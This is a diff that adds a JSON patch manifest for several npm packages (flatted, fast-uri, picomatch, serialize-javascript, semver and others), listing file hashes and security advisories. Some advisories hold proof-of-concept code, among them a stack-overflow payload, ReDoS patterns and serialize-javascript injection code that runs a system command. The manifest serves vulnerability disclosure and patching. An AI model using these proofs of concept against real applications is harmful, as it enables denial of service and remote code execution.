@@ -1,0 +1,195 @@
+{
+  "patches": {
+    "pkg:npm/flatted@3.2.7": {
+      "uuid": "e2e60bf0-cb9d-4e5d-ae58-e629b46f0fed",
+      "exportedAt": "Wed, 22 Jul 2026 22:25:05 GMT",
+      "files": {
+        "cjs/index.js": {
+          "beforeHash": "01ddc3dd9c12521e39f665c42fa28fee988cc9eafa872522d4e476574f8c8232",
+          "afterHash": "7aa11716bec0e6ccb4024683b0e58e277f565461b0dbef14f8f610d7442f6337"
+        },
+        "es.js": {
+          "beforeHash": "62e072809fdee3db5aa1eecc537105324527772c11a5ce7ac7883083bf84123b",
+          "afterHash": "67c619f976338be47e0c1da3eddacb280e2935e7ca354bce645c3b28f9cdc7ef"
+        },
+        "esm.js": {
+          "beforeHash": "60427d9991f5ad5fa1fd614077040d6d3c9cafa43cb64d2eab9eca680d50d1bf",
+          "afterHash": "e3f83e43d3591dd25cdfa1e18dca1c114b1888e17cfebb2946fe731f2de571fa"
+        },
+        "esm/index.js": {
+          "beforeHash": "d7ef53b8643f8f771aa64cf44cd95389732989c9dfcfdb1305fb90276cd86bda",
+          "afterHash": "3a456d37550f20d11a44d9e3e8053db4abef9af35c7c0464238d4bdf10c896f8"
+        },
+        "index.js": {
+          "beforeHash": "e1fe5a0d9c279446e5997bba2b0cb37f7bf15f5005370e633a01e51bf410b074",
+          "afterHash": "3d116061a226c0e9e1604366efc31b79df803308f594371d3adbb3983862eca8"
+        },
+        "min.js": {
+          "beforeHash": "2d1b28eac1a28cc3d3ab607ad56a0c20bd20f0df36b37d154804227ebded915b",
+          "afterHash": "ef7809b0030224135e16b430ad385ca1776fbc56492376e99097ee85a090c74b"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-25h7-pfq9-p65f": {
+          "cves": [
+            "CVE-2026-32141"
+          ],
+          "summary": "flatted vulnerable to unbounded recursion DoS in parse() revive phase",
+          "severity": "HIGH",
+          "description": "## Summary\n\nflatted's `parse()` function uses a recursive `revive()` phase to resolve circular references in deserialized JSON. When given a crafted payload with deeply nested or self-referential `$` indices, the recursion depth is unbounded, causing a stack overflow that crashes the Node.js process.\n\n## Impact\n\nDenial of Service (DoS). Any application that passes untrusted input to `flatted.parse()` can be crashed by an unauthenticated attacker with a single request.\n\nflatted has ~87M weekly npm downloads and is used as the circular-JSON serialization layer in many caching and logging libraries.\n\n## Proof of Concept\n\n```javascript\nconst flatted = require('flatted');\n\n// Build deeply nested circular reference chain\nconst depth = 20000;\nconst arr = new Array(depth + 1);\narr[0] = '{\"a\":\"1\"}';\nfor (let i = 1; i <= depth; i++) {\n  arr[i] = `{\"a\":\"${i + 1}\"}`;\n}\narr[depth] = '{\"a\":\"leaf\"}';\n\nconst payload = JSON.stringify(arr);\nflatted.parse(payload); // RangeError: Maximum call stack size exceeded\n```\n\n## Fix\n\nThe maintainer has already merged an iterative (non-recursive) implementation in PR #88, converting the recursive `revive()` to a stack-based loop.\n\n## Affected Versions\n\nAll versions prior to the PR #88 fix."
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/fast-uri@3.1.0": {
+      "uuid": "59e4b25f-8fe3-4daf-bff9-0e0faa0dc035",
+      "exportedAt": "Thu, 30 Jul 2026 15:28:55 GMT",
+      "files": {
+        "index.js": {
+          "beforeHash": "804473a06214202a11a0bd34eb740308f3720d23adb647873b22682fc631d93d",
+          "afterHash": "d68419620651843475984f0e17729b310c75e0f29e4c496b8529ce6433a8ab72"
+        },
+        "lib/utils.js": {
+          "beforeHash": "50bec46a9e79d5b651cd908036dc88bb4e6afda8d71f8e1cd1823b69e7ccb7f9",
+          "afterHash": "77518588a668f29909607e1ded5ceeb459c93dd0f429d1cc3729d753f235d56b"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-q3j6-qgpj-74h6": {
+          "cves": [
+            "CVE-2026-6321"
+          ],
+          "summary": "fast-uri vulnerable to path traversal via percent-encoded dot segments",
+          "severity": "HIGH",
+          "description": "### Impact\n\n`fast-uri` v3.1.0 and earlier decodes percent-encoded path separators (`%2F`) and dot segments (`%2E`) before applying dot-segment removal in `normalize()` and `equal()`. This makes encoded path data behave like real `/` and `..`, so distinct URIs collapse onto the same normalized path.\n\nFor example, `http://example.com/public/%2e%2e/admin` normalizes to `http://example.com/admin`, and `equal()` considers them the same URI.\n\nApplications that normalize or compare attacker-controlled URLs to enforce path-based policy can be bypassed. A path that looks confined under an allowed prefix can normalize to a different location.\n\n### Patches\n\nUpgrade to `fast-uri` >= 3.1.1, or if you are in the v2.x release line, v2.4.1\n\n### Workarounds\n\nNone. Upgrade to the patched version."
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/path-to-regexp@0.1.7": {
+      "uuid": "22028842-fc6d-4af0-a939-6be3019f3235",
+      "exportedAt": "Wed, 07 Jan 2026 22:25:03 GMT",
+      "files": {
+        "package/index.js": {
+          "beforeHash": "06731ab0f68cfca6b5cd1478d99ac328d10ec06df83b8a0b15e93004f5c421cc",
+          "afterHash": "20fb2467ac96dc596d481f11c463d8061b6e2f3488f3311314db156939b17189"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-rhx6-c78j-4q9w": {
+          "cves": [
+            "CVE-2024-52798"
+          ],
+          "summary": "path-to-regexp contains a ReDoS",
+          "severity": "HIGH",
+          "description": "### Impact\n\nThe regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296\n\n### Patches\n\nUpgrade to 0.1.12.\n\n### Workarounds\n\nAvoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.\n\n### References\n\n- https://github.com/advisories/GHSA-9wv6-86v2-598j\n- https://blakeembrey.com/posts/2024-09-web-redos/"
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    },
+    "pkg:npm/picomatch@2.3.1": {
+      "uuid": "fea4a59a-d944-412c-84fe-612aa9522938",
+      "exportedAt": "Fri, 17 Jul 2026 20:00:33 GMT",
+      "files": {
+        "lib/constants.js": {
+          "beforeHash": "20210bdb41e7ca568f2aa75c082c8b2f87d8e2fbf87ec02fff120cf8a534503d",
+          "afterHash": "c44ef18d63927e946f9279158c4c4f3ced9e0d7f2fba01e27d20d37922a3a6c9"
+        },
+        "lib/parse.js": {
+          "beforeHash": "cbada698cc631ccd3b05c0e6d216536ca256b7f93987d053c38fa46129a07684",
+          "afterHash": "ecf879343a7d2ca0c3b1a97a7707db0f9613d8bea4c0dc8fdfa1b11cdfd6e197"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-c2c7-rcm5-vvqj": {
+          "cves": [
+            "CVE-2026-33671"
+          ],
+          "summary": "Picomatch has a ReDoS vulnerability via extglob quantifiers",
+          "severity": "HIGH",
+          "description": "### Impact\n`picomatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing crafted extglob patterns. Certain patterns using extglob quantifiers such as `+()` and `*()`, especially when combined with overlapping alternatives or nested extglobs, are compiled into regular expressions that can exhibit catastrophic backtracking on non-matching input.\n\nExamples of problematic patterns include `+(a|aa)`, `+(*|?)`, `+(+(a))`, `*(+(a))`, and `+(+(+(a)))`. In local reproduction, these patterns caused multi-second event-loop blocking with relatively short inputs. For example, `+(a|aa)` compiled to `^(?:(?=.)(?:a|aa)+)$` and took about 2 seconds to reject a 41-character non-matching input, while nested patterns such as `+(+(a))` and `*(+(a))` took around 29 seconds to reject a 33-character input on a modern M1 MacBook.\n\nApplications are impacted when they allow untrusted users to supply glob patterns that are passed to `picomatch` for compilation or matching. In those cases, an attacker can cause excessive CPU consumption and block the Node.js event loop, resulting in a denial of service. Applications that only use trusted, developer-controlled glob patterns are much less likely to be exposed in a security-relevant way.\n\n### Patches\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to `picomatch`.\n\nPossible mitigations include:\n- disable extglob support for untrusted patterns by using `noextglob: true`\n- reject or sanitize patterns containing nested extglobs or extglob quantifiers such as `+()` and `*()`\n- enforce strict allowlists for accepted pattern syntax\n- run matching in an isolated worker or separate process with time and resource limits\n- apply application-level request throttling and input validation for any endpoint that accepts glob patterns\n\n### Resources\n- Picomatch repository: https://github.com/micromatch/picomatch\n- `lib/parse.js` and `lib/constants.js` are involved in generating the vulnerable regex forms\n- Comparable ReDoS precedent: CVE-2024-4067 (`micromatch`)\n- Comparable generated-regex precedent: CVE-2024-45296 (`path-to-regexp`)"
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/serialize-javascript@6.0.2": {
+      "uuid": "297b20b0-abd1-4377-ad96-ddb21c31fbd4",
+      "exportedAt": "Mon, 27 Jul 2026 21:53:26 GMT",
+      "files": {
+        "index.js": {
+          "beforeHash": "5e759421d6346fc01321ced6be01e42e89a722d28dd2e06becd75a307fc5cb10",
+          "afterHash": "2b8d0e59bf1b8a0f860cded1c239ae75e663981eb075f23f00475d56de78b5f9"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-5c6j-r48x-rmvq": {
+          "cves": [],
+          "summary": "Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()",
+          "severity": "HIGH",
+          "description": "### Impact\n\nThe serialize-javascript npm package (versions <= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.\n\nWhile `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.\n\nIf an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the injected code executes.\n\n```javascript\nconst serialize = require('serialize-javascript');\n// Create an object that passes instanceof RegExp with a spoofed .flags\nconst fakeRegex = Object.create(RegExp.prototype);\nObject.defineProperty(fakeRegex, 'source', { get: () => 'x' });\nObject.defineProperty(fakeRegex, 'flags', {\n  get: () => '\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"'\n});\nfakeRegex.toJSON = function() { return '@placeholder'; };\nconst output = serialize({ re: fakeRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"\")}\nlet obj;\neval('obj = ' + output);\nconsole.log(global.PWNED); // \"CODE_INJECTION_VIA_FLAGS\" — injected code executed!\n#h2. PoC 2: Code Injection via Date.toISOString()\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst fakeDate = Object.create(Date.prototype);\nfakeDate.toISOString = function() { return '\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"'; };\nfakeDate.toJSON = function() { return '2024-01-01'; };\nconst output = serialize({ d: fakeDate });\n// Output: {\"d\":new Date(\"\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"\")}\neval('obj = ' + output);\nconsole.log(global.DATE_PWNED); // \"DATE_INJECTION\" — injected code executed!\n#h2. PoC 3: Remote Code Execution\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst rceRegex = Object.create(RegExp.prototype);\nObject.defineProperty(rceRegex, 'source', { get: () => 'x' });\nObject.defineProperty(rceRegex, 'flags', {\n  get: () => '\"+require(\"child_process\").execSync(\"id\").toString()+\"'\n});\nrceRegex.toJSON = function() { return '@rce'; };\nconst output = serialize({ re: rceRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+require(\"child_process\").execSync(\"id\").toString()+\"\")}\n// When eval'd on a Node.js server, executes the \"id\" system command\n```\n\n### Patches\n\nThe fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3"
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/semver@6.3.0": {
+      "uuid": "0ccbea2e-5fe1-4065-8b9c-58a26b45b74f",
+      "exportedAt": "Fri, 26 Jun 2026 19:43:41 GMT",
+      "files": {
+        "package/semver.js": {
+          "beforeHash": "729953af7a9511b4b7a21bd5c0afc003bbda4c66dc34940885d1fbb345d6d23f",
+          "afterHash": "cc16eaf873577ba98c1b59174a249099c929c5b39964b3dc1cda3027bd03d607"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-c2qf-rxjj-qqgw": {
+          "cves": [
+            "CVE-2022-25883"
+          ],
+          "summary": "semver vulnerable to Regular Expression Denial of Service",
+          "severity": "HIGH",
+          "description": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range."
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    },
+    "pkg:npm/semver@7.3.8": {
+      "uuid": "2cd4a397-6e1f-4b39-8542-9fff14282b34",
+      "exportedAt": "Fri, 26 Jun 2026 19:45:42 GMT",
+      "files": {
+        "package/classes/range.js": {
+          "beforeHash": "c0758dbdb4db31f3d90780d8dcf4976c4751878b096c4097a5548fa75cc229dc",
+          "afterHash": "7f30e7134348aa0f0070a6e29ff134522098cd55e907395ef20d0361ab7ee806"
+        },
+        "package/internal/re.js": {
+          "beforeHash": "723062c8d0d46514a4713194cdd44e598584d57f8d1173c7402c7ae1f01cef2c",
+          "afterHash": "66a28b402a8626e124fced5211fb4c663d6e0f3edb681a0257bf6888a89237b2"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-c2qf-rxjj-qqgw": {
+          "cves": [
+            "CVE-2022-25883"
+          ],
+          "summary": "semver vulnerable to Regular Expression Denial of Service",
+          "severity": "HIGH",
+          "description": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range."
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    }
+  }
+}
